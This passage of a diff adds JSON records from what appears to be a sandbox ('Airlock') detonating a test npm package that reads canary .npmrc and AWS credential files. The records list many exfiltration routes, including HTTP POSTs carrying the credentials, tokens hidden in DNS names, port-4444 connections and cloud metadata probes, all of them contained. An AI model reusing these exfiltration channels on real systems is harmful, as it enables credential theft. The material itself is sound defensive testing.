+          "data": {
+            "stage": "detonate",
+            "host": "registry.npmjs.org",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 556,
+            "source_kind": "node",
+            "allowlisted": true
+          },
+          "ts": 1793926035.621453,
+          "id": 35,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "probe.js tried to reach h443.catch.darkflib.dev; contained, never reached the internet",
+          "data": {
+            "stage": "detonate",
+            "host": "h443.catch.darkflib.dev",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 556,
+            "source_kind": "node"
+          },
+          "ts": 1793926035.6214557,
+          "id": 36,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "probe.js tried to reach h80.catch.darkflib.dev; contained, never reached the internet",
+          "data": {
+            "stage": "detonate",
+            "host": "h80.catch.darkflib.dev",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 556,
+            "source_kind": "node"
+          },
+          "ts": 1793926035.6214588,
+          "id": 37,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "probe.js tried to reach odd.catch.darkflib.dev:4444; contained, never reached the internet",
+          "data": {
+            "stage": "detonate",
+            "host": "odd.catch.darkflib.dev:4444",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 556,
+            "source_kind": "node"
+          },
+          "ts": 1793926035.6214619,
+          "id": 38,
+          "containment": true
+        },
+        {
+          "kind": "canary_exfil",
+          "summary": "probe.js tried to send canary credentials to odd.catch.darkflib.dev:4444 in a request URL",
+          "data": {
+            "stage": "detonate",
+            "host": "odd.catch.darkflib.dev:4444",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 556,
+            "source_kind": "node"
+          },
+          "ts": 1793926035.621464,
+          "id": 39,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "probe.js tried to reach 95.179.197.125; contained, never reached the internet",
+          "data": {
+            "stage": "detonate",
+            "host": "95.179.197.125",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 556,
+            "source_kind": "node"
+          },
+          "ts": 1793926035.6214666,
+          "id": 40,
+          "containment": true
+        },
+        {
+          "kind": "canary_exfil",
+          "summary": "probe.js tried to send canary credentials to 95.179.197.125 in a request URL",
+          "data": {
+            "stage": "detonate",
+            "host": "95.179.197.125",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 556,
+            "source_kind": "node"
+          },
+          "ts": 1793926035.6214688,
+          "id": 41,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "probe.js tried to reach [2001:19f0:7400:219f:5400:7ff:fe03:9747]; contained, never reached the internet",
+          "data": {
+            "stage": "detonate",
+            "host": "[2001:19f0:7400:219f:5400:7ff:fe03:9747]",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 556,
+            "source_kind": "node"
+          },
+          "ts": 1793926035.6214712,
+          "id": 42,
+          "containment": true
+        },
+        {
+          "kind": "canary_exfil",
+          "summary": "probe.js tried to send canary credentials to [2001:19f0:7400:219f:5400:7ff:fe03:9747] in a request URL",
+          "data": {
+            "stage": "detonate",
+            "host": "[2001:19f0:7400:219f:5400:7ff:fe03:9747]",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 556,
+            "source_kind": "node"
+          },
+          "ts": 1793926035.6214738,
+          "id": 43,
+          "containment": true
+        },
+        {
+          "kind": "canary_exfil",
+          "summary": "probe.js tried to send canary credentials to 2001:19f0:7400:219f:5400:7ff:fe03:9747",
+          "data": {
+            "stage": "detonate",
+            "host": "2001:19f0:7400:219f:5400:7ff:fe03:9747",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 556,
+            "source_kind": "node"
+          },
+          "ts": 1793926035.6214762,
+          "id": 44,
+          "containment": true
+        },
+        {
+          "kind": "canary_exfil",
+          "summary": "node put the canary token in a DNS lookup of airlockcanary0e695f5d218fa026.dns-res.invalid: answered by Airlock inside the VM, never left it",
+          "data": {
+            "stage": "detonate",
+            "pid": 556,
+            "cmd": "node probe.js",
+            "exe": "/usr/local/bin/node",
+            "source_kind": "watch",
+            "host": "airlockcanary0e695f5d218fa026.dns-res.invalid",
+            "via": "dns",
+            "payload": "airlockcanary0e695f5d218fa026.dns-res.invalid"
+          },
+          "ts": 1793926035.6214864,
+          "id": 47,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "node looked up airlockcanary0e695f5d218fa026.dns-res.invalid; answered with sinkhole address 198.19.157.138",
+          "data": {
+            "stage": "detonate",
+            "pid": 556,
+            "cmd": "node probe.js",
+            "exe": "/usr/local/bin/node",
+            "source_kind": "watch",
+            "host": "airlockcanary0e695f5d218fa026.dns-res.invalid",
+            "via": "dns"
+          },
+          "ts": 1793926035.6214888,
+          "id": 48,
+          "containment": true
+        },
+        {
+          "kind": "canary_exfil",
+          "summary": "node put the canary token in a DNS lookup of airlockcanary0e695f5d218fa026.res.catch.darkflib.dev: answered by Airlock inside the VM, never left it",
+          "data": {
+            "stage": "detonate",
+            "pid": 556,
+            "cmd": "node probe.js",
+            "exe": "/usr/local/bin/node",
+            "source_kind": "watch",
+            "host": "airlockcanary0e695f5d218fa026.res.catch.darkflib.dev",
+            "via": "dns",
+            "payload": "airlockcanary0e695f5d218fa026.res.catch.darkflib.dev"
+          },
+          "ts": 1793926035.6214924,
+          "id": 49,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "node looked up airlockcanary0e695f5d218fa026.res.catch.darkflib.dev; answered with sinkhole address 198.19.157.36",
+          "data": {
+            "stage": "detonate",
+            "pid": 556,
+            "cmd": "node probe.js",
+            "exe": "/usr/local/bin/node",
+            "source_kind": "watch",
+            "host": "airlockcanary0e695f5d218fa026.res.catch.darkflib.dev",
+            "via": "dns"
+          },
+          "ts": 1793926035.6214948,
+          "id": 50,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "6 outbound connection attempts refused by the egress policy (refused too fast to attribute to a process)",
+          "data": {
+            "stage": "detonate",
+            "count": 6,
+            "via": "tcp-counter",
+            "source_kind": "watch",
+            "ts_guest": 1793926034.2764268
+          },
+          "ts": 1793926035.6215007,
+          "id": 52,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "node tried to connect to raw IP 172.16.0.5:443; not allowlisted, refused by egress policy",
+          "data": {
+            "stage": "detonate",
+            "pid": 556,
+            "cmd": "node probe.js",
+            "exe": "/usr/local/bin/node",
+            "source_kind": "watch",
+            "host": "172.16.0.5:443",
+            "via": "connect"
+          },
+          "ts": 1793926035.6215043,
+          "id": 53,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "6 outbound connection attempts refused by the egress policy (refused too fast to attribute to a process)",
+          "data": {
+            "stage": "detonate",
+            "count": 6,
+            "via": "tcp-counter",
+            "source_kind": "watch",
+            "ts_guest": 1793926034.3143795
+          },
+          "ts": 1793926035.6215117,
+          "id": 54,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "a process tried to connect to raw IP 95.179.197.125:80; not allowlisted, refused by egress policy",
+          "data": {
+            "stage": "detonate",
+            "pid": null,
+            "cmd": "",
+            "exe": null,
+            "source_kind": "watch",
+            "host": "95.179.197.125:80",
+            "via": "connect"
+          },
+          "ts": 1793926035.621516,
+          "id": 55,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "a process tried to connect to raw IP 1.1.1.1:53; not allowlisted, refused by egress policy",
+          "data": {
+            "stage": "detonate",
+            "pid": null,
+            "cmd": "",
+            "exe": null,
+            "source_kind": "watch",
+            "host": "1.1.1.1:53",
+            "via": "connect"
+          },
+          "ts": 1793926035.6215189,
+          "id": 56,
+          "containment": true
+        }
+      ]
+    },
+    {
+      "seconds": 5.3,
+      "window": [
+        1793926037.3020391,
+        1793926042.5928702
+      ],
+      "install_exit": 0,
+      "token_matches_canary": true,
+      "probe_token": "AIRLOCKCANARYF282471D111210D0",
+      "gateway": "172.16.0.5",
+      "outside": {
+        "v4": "78.141.205.99",
+        "v6": "2a05:f480:1000:95d:5400:7ff:fe00:80d0",
+        "port": 47801,
+        "catcher": {
+          "zone": "catch.darkflib.dev",
+          "v4": "95.179.197.125",
+          "v6": "2001:19f0:7400:219f:5400:7ff:fe03:9747"
+        }
+      },
+      "outside_heard": [],
+      "probe": [
+        {
+          "id": "http-name-443",
+          "what": "HTTPS POST to a name",
+          "outcome": "answered",
+          "detail": "HTTP 200, 11 bytes",
+          "server": null,
+          "body": "{\"ok\":true}",
+          "addr": "198.19.41.6",
+          "ms": 165
+        },
+        {
+          "id": "http-name-80",
+          "what": "HTTP POST to a name",
+          "outcome": "answered",
+          "detail": "HTTP 200, 11 bytes",
+          "server": null,
+          "body": "{\"ok\":true}",
+          "addr": "198.19.41.238",
+          "ms": 111
+        },
+        {
+          "id": "http-name-odd-port",
+          "what": "HTTP POST to a name on port 4444",
+          "outcome": "error",
+          "detail": "ECONNREFUSED",
+          "ms": 102
+        },
+        {
+          "id": "dns-resolver",
+          "what": "token in a DNS name, system resolver",
+          "outcome": "resolved",
+          "detail": "198.19.41.174",
+          "addr": "198.19.41.174",
+          "ms": 82
+        },
+        {
+          "id": "dns-gateway-udp",
+          "what": "token in a DNS name, straight to the gateway",
+          "outcome": "answered",
+          "detail": "rcode 3, 0 answers",
+          "ms": 83
+        },
+        {
+          "id": "dns-public-udp",
+          "what": "token in a DNS name, straight to 8.8.8.8 (UDP)",
+          "outcome": "answered",
+          "detail": "rcode 3, 0 answers",
+          "ms": 81
+        },
+        {
+          "id": "dns-public-tcp",
+          "what": "token in a DNS name, straight to 1.1.1.1 (TCP)",
+          "outcome": "answered",
+          "detail": "rcode 3, 0 answers",
+          "ms": 92
+        },
+        {
+          "id": "dns-public-real-udp",
+          "what": "example.com straight to 8.8.8.8 (UDP)",
+          "outcome": "answered",
+          "detail": "rcode 3, 0 answers",
+          "ms": 84
+        },
+        {
+          "id": "dns-public-real-tcp",
+          "what": "example.com straight to 1.1.1.1 (TCP)",
+          "outcome": "answered",
+          "detail": "rcode 3, 0 answers",
+          "ms": 92
+        },
+        {
+          "id": "dns-gateway-real",
+          "what": "example.com straight to the gateway",
+          "outcome": "answered",
+          "detail": "rcode 3, 0 answers",
+          "ms": 98
+        },
+        {
+          "id": "raw-ip-https",
+          "what": "HTTPS POST to a public IP (1.1.1.1)",
+          "outcome": "answered",
+          "detail": "HTTP 403, 98 bytes",
+          "server": null,
+          "body": "{\"code\":\"network_policy_denied\",\"domain\":\"1.1.1.1\",\"message\":\"Request blocked by network policy.\"}",
+          "addr": "1.1.1.1",
+          "ms": 104
+        },
+        {
+          "id": "raw-ip-http",
+          "what": "HTTP POST to a documentation IP (203.0.113.7)",
+          "outcome": "answered",
+          "detail": "HTTP 403, 102 bytes",
+          "server": null,
+          "body": "{\"code\":\"network_policy_denied\",\"domain\":\"203.0.113.7\",\"message\":\"Request blocked by network policy.\"}",
+          "addr": "203.0.113.7",
+          "ms": 94
+        },
+        {
+          "id": "raw-ip-odd-port",
+          "what": "TCP to a public IP on port 4444 (8.8.4.4)",
+          "outcome": "error",
+          "detail": "ECONNREFUSED",
+          "ms": 83
+        },
+        {
+          "id": "ipv6",
+          "what": "TCP over IPv6 to 2606:4700:4700::1111",
+          "outcome": "connected",
+          "ms": 83
+        },
+        {
+          "id": "ipv6-http",
+          "what": "HTTP GET over IPv6 to Cloudflare (2606:4700:4700::1111)",
+          "outcome": "answered",
+          "detail": "HTTP 403, 107 bytes",
+          "server": null,
+          "body": "{\"code\":\"network_policy_denied\",\"domain\":\"[2606:4700:4700:\",\"message\":\"Request blocked by network policy.\"}",
+          "addr": "2606:4700:4700::1111",
+          "ms": 80
+        },
+        {
+          "id": "outside-v4-port",
+          "what": "token over TCP to the lab listener, IPv4",
+          "outcome": "error",
+          "detail": "ECONNREFUSED",
+          "ms": 70
+        },
+        {
+          "id": "outside-v6-port",
+          "what": "token over TCP to the lab listener, IPv6",
+          "outcome": "error",
+          "detail": "ECONNREFUSED",
+          "ms": 70
+        },
+        {
+          "id": "outside-v4-http",
+          "what": "HTTP POST to the host's public IPv4, port 80",
+          "outcome": "answered",
+          "detail": "HTTP 403, 104 bytes",
+          "server": null,
+          "body": "{\"code\":\"network_policy_denied\",\"domain\":\"78.141.205.99\",\"message\":\"Request blocked by network policy.\"}",
+          "addr": "78.141.205.99",
+          "ms": 78
+        },
+        {
+          "id": "outside-v6-http",
+          "what": "HTTP POST to the host's public IPv6, port 80",
+          "outcome": "answered",
+          "detail": "HTTP 403, 124 bytes",
+          "server": null,
+          "body": "{\"code\":\"network_policy_denied\",\"domain\":\"[2a05:f480:1000:95d:5400:7ff:fe00\",\"message\":\"Request blocked by network policy.\"}",
+          "addr": "2a05:f480:1000:95d:5400:7ff:fe00:80d0",
+          "ms": 78
+        },
+        {
+          "id": "icmp",
+          "what": "ping 1.1.1.1 with token bytes in the payload",
+          "outcome": "error",
+          "detail": "spawn ping ENOENT",
+          "ms": 61
+        },
+        {
+          "id": "icmp-socket",
+          "what": "ICMP echo from an unprivileged ping socket (Python)",
+          "outcome": "error",
+          "detail": "PermissionError: [Errno 13] Permission denied",
+          "ms": 83
+        },
+        {
+          "id": "imds-aws",
+          "what": "metadata service, AWS path (169.254.169.254)",
+          "outcome": "answered",
+          "detail": "HTTP 403, 106 bytes",
+          "server": null,
+          "body": "{\"code\":\"network_policy_denied\",\"domain\":\"169.254.169.254\",\"message\":\"Request blocked by network policy.\"}",
+          "addr": "169.254.169.254",
+          "ms": 72
+        },
+        {
+          "id": "imds-vultr",
+          "what": "metadata service, Vultr path (169.254.169.254)",
+          "outcome": "answered",
+          "detail": "HTTP 403, 106 bytes",
+          "server": null,
+          "body": "{\"code\":\"network_policy_denied\",\"domain\":\"169.254.169.254\",\"message\":\"Request blocked by network policy.\"}",
+          "addr": "169.254.169.254",
+          "ms": 71
+        },
+        {
+          "id": "imds-gcp-name",
+          "what": "metadata service by name (metadata.google.internal)",
+          "outcome": "answered",
+          "detail": "HTTP 200, 11 bytes",
+          "server": null,
+          "body": "{\"ok\":true}",
+          "addr": "198.19.41.87",
+          "ms": 82
+        },
+        {
+          "id": "imds-ecs",
+          "what": "container credentials endpoint (169.254.170.2)",
+          "outcome": "answered",
+          "detail": "HTTP 403, 104 bytes",
+          "server": null,
+          "body": "{\"code\":\"network_policy_denied\",\"domain\":\"169.254.170.2\",\"message\":\"Request blocked by network policy.\"}",
+          "addr": "169.254.170.2",
+          "ms": 68
+        },
+        {
+          "id": "imds-alibaba",
+          "what": "metadata service, Alibaba (100.100.100.200)",
+          "outcome": "answered",
+          "detail": "HTTP 403, 106 bytes",
+          "server": null,
+          "body": "{\"code\":\"network_policy_denied\",\"domain\":\"100.100.100.200\",\"message\":\"Request blocked by network policy.\"}",
+          "addr": "100.100.100.200",
+          "ms": 68
+        },
+        {
+          "id": "gateway-22",
+          "what": "TCP to the gateway (172.16.0.5) port 22",
+          "outcome": "error",
+          "detail": "ECONNREFUSED",
+          "ms": 60
+        },
+        {
+          "id": "gateway-53",
+          "what": "TCP to the gateway (172.16.0.5) port 53",
+          "outcome": "connected",
+          "ms": 60
+        },
+        {
+          "id": "gateway-80",
+          "what": "TCP to the gateway (172.16.0.5) port 80",
+          "outcome": "connected",
+          "ms": 61
+        },
+        {
+          "id": "gateway-443",
+          "what": "TCP to the gateway (172.16.0.5) port 443",
+          "outcome": "connected",
+          "ms": 61
+        },
+        {
+          "id": "gateway-1080",
+          "what": "TCP to the gateway (172.16.0.5) port 1080",
+          "outcome": "error",
+          "detail": "ECONNREFUSED",
+          "ms": 61
+        },
+        {
+          "id": "gateway-2019",
+          "what": "TCP to the gateway (172.16.0.5) port 2019",
+          "outcome": "error",
+          "detail": "ECONNREFUSED",
+          "ms": 61
+        },
+        {
+          "id": "gateway-8000",
+          "what": "TCP to the gateway (172.16.0.5) port 8000",
+          "outcome": "error",
+          "detail": "ECONNREFUSED",
+          "ms": 60
+        },
+        {
+          "id": "docker-api",
+          "what": "Docker API on 172.17.0.1:2375",
+          "outcome": "error",
+          "detail": "ECONNREFUSED",
+          "ms": 60
+        },
+        {
+          "id": "private-10",
+          "what": "private range 10.0.0.1:80",
+          "outcome": "connected",
+          "ms": 60
+        },
+        {
+          "id": "private-192",
+          "what": "private range 192.168.1.1:80",
+          "outcome": "connected",
+          "ms": 60
+        },
+        {
+          "id": "registry-url",
+          "what": "token in a search URL on registry.npmjs.org (allowed)",
+          "outcome": "answered",
+          "detail": "HTTP 200, 58 bytes",
+          "server": "cloudflare",
+          "body": "{\"objects\":[],\"total\":0,\"time\":\"2026-11-06T00:47:20.121Z\"}",
+          "addr": "104.16.5.34",
+          "ms": 494
+        },
+        {
+          "id": "catcher-https-name",
+          "what": "HTTPS POST to the catcher by its real name",
+          "outcome": "answered",
+          "detail": "HTTP 200, 11 bytes",
+          "server": null,
+          "body": "{\"ok\":true}",
+          "addr": "198.19.41.1",
+          "ms": 122
+        },
+        {
+          "id": "catcher-http-name",
+          "what": "HTTP POST to the catcher by its real name",
+          "outcome": "answered",
+          "detail": "HTTP 200, 11 bytes",
+          "server": null,
+          "body": "{\"ok\":true}",
+          "addr": "198.19.41.65",
+          "ms": 77
+        },
+        {
+          "id": "catcher-name-odd-port",
+          "what": "HTTP POST to the catcher by name, port 4444",
+          "outcome": "error",
+          "detail": "ECONNREFUSED",
+          "ms": 68
+        },
+        {
+          "id": "catcher-v4-http",
+          "what": "HTTP POST to the catcher's IPv4",
+          "outcome": "answered",
+          "detail": "HTTP 403, 105 bytes",
+          "server": null,
+          "body": "{\"code\":\"network_policy_denied\",\"domain\":\"95.179.197.125\",\"message\":\"Request blocked by network policy.\"}",
+          "addr": "95.179.197.125",
+          "ms": 63
+        },
+        {
+          "id": "catcher-v4-https",
+          "what": "HTTPS POST to the catcher's IPv4",
+          "outcome": "answered",
+          "detail": "HTTP 403, 105 bytes",
+          "server": null,
+          "body": "{\"code\":\"network_policy_denied\",\"domain\":\"95.179.197.125\",\"message\":\"Request blocked by network policy.\"}",
+          "addr": "95.179.197.125",
+          "ms": 69
+        },
+        {
+          "id": "catcher-v4-tcp",
+          "what": "token over raw TCP to the catcher's IPv4, port 4444",
+          "outcome": "error",
+          "detail": "ECONNREFUSED",
+          "ms": 53
+        },
+        {
+          "id": "catcher-v4-tcp-53",
+          "what": "token over raw TCP to the catcher's IPv4, port 53",
+          "outcome": "connected",
+          "detail": "sent, no reply",
+          "ms": 554
+        },
+        {
+          "id": "catcher-v6-http",
+          "what": "HTTP POST to the catcher's IPv6",
+          "outcome": "answered",
+          "detail": "HTTP 403, 125 bytes",
+          "server": null,
+          "body": "{\"code\":\"network_policy_denied\",\"domain\":\"[2001:19f0:7400:219f:5400:7ff:fe03\",\"message\":\"Request blocked by network policy.\"}",
+          "addr": "2001:19f0:7400:219f:5400:7ff:fe03:9747",
+          "ms": 60
+        },
+        {
+          "id": "catcher-v6-tcp",
+          "what": "token over raw TCP to the catcher's IPv6, port 47801",
+          "outcome": "error",
+          "detail": "ECONNREFUSED",
+          "ms": 54
+        },
+        {
+          "id": "catcher-dns-resolver",
+          "what": "token in a lookup in the catcher's zone, system resolver",
+          "outcome": "resolved",
+          "detail": "198.19.41.100",
+          "addr": "198.19.41.100",
+          "ms": 43
+        },
+        {
+          "id": "catcher-dns-gateway",
+          "what": "token in a lookup in the catcher's zone, straight to the gateway",
+          "outcome": "answered",
+          "detail": "rcode 3, 0 answers",
+          "ms": 61
+        },
+        {
+          "id": "catcher-dns-8888",
+          "what": "token in a lookup in the catcher's zone, straight to 8.8.8.8 (UDP)",
+          "outcome": "answered",
+          "detail": "rcode 3, 0 answers",
+          "ms": 61
+        },
+        {
+          "id": "catcher-dns-1111-tcp",
+          "what": "token in a lookup in the catcher's zone, straight to 1.1.1.1 (TCP)",
+          "outcome": "answered",
+          "detail": "rcode 3, 0 answers",
+          "ms": 61
+        },
+        {
+          "id": "catcher-dns-direct",
+          "what": "token in a lookup sent straight to the catcher (UDP 53)",
+          "outcome": "answered",
+          "detail": "rcode 3, 0 answers",
+          "ms": 61
+        },
+        {
+          "id": "catcher-dns-direct-tcp",
+          "what": "token in a lookup sent straight to the catcher (TCP 53)",
+          "outcome": "answered",
+          "detail": "rcode 3, 0 answers",
+          "ms": 61
+        },
+        {
+          "id": "catcher-icmp",
+          "what": "ping the catcher with token bytes in the payload",
+          "outcome": "error",
+          "detail": "spawn ping ENOENT",
+          "ms": 42
+        }
+      ],
+      "recorded": [
+        {
+          "kind": "canary_exfil",
+          "summary": "POST http://h80.exfil-probe.invalid/x carried the canary credentials: captured by Airlock's sinkhole, never reached the internet",
+          "data": {
+            "stage": "detonate",
+            "host": "h80.exfil-probe.invalid",
+            "url": "http://h80.exfil-probe.invalid/x",
+            "method": "POST",
+            "bytes": 175,
+            "payload": "//registry.npmjs.org/:_authToken=npm_AIRLOCKCANARYF282471D111210D0\n[default]\naws_access_key_id = AKIA471D111210D0\naws_secret_access_key = AIRLOCKCANARYF282471D111210D0/canary\n",
+            "user_agent": "",
+            "source_kind": "sinkhole",
+            "proven": true,
+            "this_run": true
+          },
+          "ts": 1793926040.91318,
+          "id": 6,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "GET http://metadata.google.internal/computeMetadata/v1/ (0 bytes): answered by Airlock's sinkhole, never reached the internet",
+          "data": {
+            "stage": "detonate",
+            "host": "metadata.google.internal",
+            "url": "http://metadata.google.internal/computeMetadata/v1/",
+            "method": "GET",
+            "bytes": 0,
+            "payload": "",
+            "user_agent": "",
+            "source_kind": "sinkhole"
+          },
+          "ts": 1793926040.9131866,
+          "id": 7,
+          "containment": true
+        },
+        {
+          "kind": "canary_exfil",
+          "summary": "POST http://h80.catch.darkflib.dev/x?t=AIRLOCKCANARYF282471D111210D0 carried the canary credentials: captured by Airlock's sinkhole, never reached the internet",
+          "data": {
+            "stage": "detonate",
+            "host": "h80.catch.darkflib.dev",
+            "url": "http://h80.catch.darkflib.dev/x?t=AIRLOCKCANARYF282471D111210D0",
+            "method": "POST",
+            "bytes": 175,
+            "payload": "//registry.npmjs.org/:_authToken=npm_AIRLOCKCANARYF282471D111210D0\n[default]\naws_access_key_id = AKIA471D111210D0\naws_secret_access_key = AIRLOCKCANARYF282471D111210D0/canary\n",
+            "user_agent": "",
+            "source_kind": "sinkhole",
+            "proven": true,
+            "this_run": true
+          },
+          "ts": 1793926040.91319,
+          "id": 8,
+          "containment": true
+        },
+        {
+          "kind": "canary_exfil",
+          "summary": "POST https://h443.exfil-probe.invalid/x carried the canary credentials: captured by Airlock's sinkhole, never reached the internet",
+          "data": {
+            "stage": "detonate",
+            "host": "h443.exfil-probe.invalid",
+            "url": "https://h443.exfil-probe.invalid/x",
+            "method": "POST",
+            "bytes": 175,
+            "payload": "//registry.npmjs.org/:_authToken=npm_AIRLOCKCANARYF282471D111210D0\n[default]\naws_access_key_id = AKIA471D111210D0\naws_secret_access_key = AIRLOCKCANARYF282471D111210D0/canary\n",
+            "user_agent": "",
+            "source_kind": "sinkhole",
+            "proven": true,
+            "this_run": true
+          },
+          "ts": 1793926040.9131927,
+          "id": 9,
+          "containment": true
+        },
+        {
+          "kind": "canary_exfil",
+          "summary": "POST https://h443.catch.darkflib.dev/x?t=AIRLOCKCANARYF282471D111210D0 carried the canary credentials: captured by Airlock's sinkhole, never reached the internet",
+          "data": {
+            "stage": "detonate",
+            "host": "h443.catch.darkflib.dev",
+            "url": "https://h443.catch.darkflib.dev/x?t=AIRLOCKCANARYF282471D111210D0",
+            "method": "POST",
+            "bytes": 175,
+            "payload": "//registry.npmjs.org/:_authToken=npm_AIRLOCKCANARYF282471D111210D0\n[default]\naws_access_key_id = AKIA471D111210D0\naws_secret_access_key = AIRLOCKCANARYF282471D111210D0/canary\n",
+            "user_agent": "",
+            "source_kind": "sinkhole",
+            "proven": true,
+            "this_run": true
+          },
+          "ts": 1793926040.913195,
+          "id": 10,
+          "containment": true
+        },
+        {
+          "kind": "canary_exfil",
+          "summary": "DNS lookup of AIRLOCKCANARYF282471D111210D0.dns-gw.invalid carried the canary token: answered NXDOMAIN by Airlock, never left the host",
+          "data": {
+            "stage": "detonate",
+            "host": "AIRLOCKCANARYF282471D111210D0.dns-gw.invalid",
+            "payload": "AIRLOCKCANARYF282471D111210D0.dns-gw.invalid",
+            "source_kind": "dns",
+            "proven": true,
+            "this_run": true
+          },
+          "ts": 1793926040.9131978,
+          "id": 11,
+          "containment": true
+        },
+        {
+          "kind": "dns_blocked",
+          "summary": "DNS lookup of example.com went straight to the gateway, bypassing Airlock's resolver: refused, never left the host",
+          "data": {
+            "stage": "detonate",
+            "host": "example.com",
+            "payload": "example.com",
+            "source_kind": "dns"
+          },
+          "ts": 1793926040.9131997,
+          "id": 12,
+          "containment": true
+        },
+        {
+          "kind": "canary_exfil",
+          "summary": "DNS lookup of AIRLOCKCANARYF282471D111210D0.gw.catch.darkflib.dev carried the canary token: answered NXDOMAIN by Airlock, never left the host",
+          "data": {
+            "stage": "detonate",
+            "host": "AIRLOCKCANARYF282471D111210D0.gw.catch.darkflib.dev",
+            "payload": "AIRLOCKCANARYF282471D111210D0.gw.catch.darkflib.dev",
+            "source_kind": "dns",
+            "proven": true,
+            "this_run": true
+          },
+          "ts": 1793926040.9132013,
+          "id": 13,
+          "containment": true
+        },
+        {
+          "kind": "canary_read",
+          "summary": "probe.js read canary /home/node/.npmrc",
+          "data": {
+            "stage": "detonate",
+            "path": "/home/node/.npmrc",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 555,
+            "source_kind": "node"
+          },
+          "ts": 1793926040.9132035,
+          "id": 14,
+          "containment": true
+        },
+        {
+          "kind": "canary_read",
+          "summary": "probe.js read canary /home/node/.aws/credentials",
+          "data": {
+            "stage": "detonate",
+            "path": "/home/node/.aws/credentials",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 555,
+            "source_kind": "node"
+          },
+          "ts": 1793926040.913205,
+          "id": 15,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "probe.js tried to reach h443.exfil-probe.invalid; contained, never reached the internet",
+          "data": {
+            "stage": "detonate",
+            "host": "h443.exfil-probe.invalid",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 555,
+            "source_kind": "node"
+          },
+          "ts": 1793926040.9132066,
+          "id": 16,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "probe.js tried to reach h80.exfil-probe.invalid; contained, never reached the internet",
+          "data": {
+            "stage": "detonate",
+            "host": "h80.exfil-probe.invalid",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 555,
+            "source_kind": "node"
+          },
+          "ts": 1793926040.9132085,
+          "id": 17,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "probe.js tried to reach odd.exfil-probe.invalid:4444; contained, never reached the internet",
+          "data": {
+            "stage": "detonate",
+            "host": "odd.exfil-probe.invalid:4444",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 555,
+            "source_kind": "node"
+          },
+          "ts": 1793926040.913211,
+          "id": 18,
+          "containment": true
+        },
+        {
+          "kind": "canary_exfil",
+          "summary": "probe.js tried to send canary credentials to odd.exfil-probe.invalid",
+          "data": {
+            "stage": "detonate",
+            "host": "odd.exfil-probe.invalid",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 555,
+            "source_kind": "node"
+          },
+          "ts": 1793926040.9132123,
+          "id": 19,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "probe.js tried to reach 1.1.1.1; contained, never reached the internet",
+          "data": {
+            "stage": "detonate",
+            "host": "1.1.1.1",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 555,
+            "source_kind": "node"
+          },
+          "ts": 1793926040.913214,
+          "id": 20,
+          "containment": true
+        },
+        {
+          "kind": "canary_exfil",
+          "summary": "probe.js tried to send canary credentials to 1.1.1.1",
+          "data": {
+            "stage": "detonate",
+            "host": "1.1.1.1",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 555,
+            "source_kind": "node"
+          },
+          "ts": 1793926040.9132152,
+          "id": 21,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "probe.js tried to reach 203.0.113.7; contained, never reached the internet",
+          "data": {
+            "stage": "detonate",
+            "host": "203.0.113.7",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 555,
+            "source_kind": "node"
+          },
+          "ts": 1793926040.9132168,
+          "id": 22,
+          "containment": true
+        },
+        {
+          "kind": "canary_exfil",
+          "summary": "probe.js tried to send canary credentials to 203.0.113.7",
+          "data": {
+            "stage": "detonate",
+            "host": "203.0.113.7",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 555,
+            "source_kind": "node"
+          },
+          "ts": 1793926040.9132183,
+          "id": 23,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "probe.js tried to reach [2606:4700:4700::1111]; contained, never reached the internet",
+          "data": {
+            "stage": "detonate",
+            "host": "[2606:4700:4700::1111]",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 555,
+            "source_kind": "node"
+          },
+          "ts": 1793926040.9132206,
+          "id": 24,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "probe.js tried to reach 78.141.205.99; contained, never reached the internet",
+          "data": {
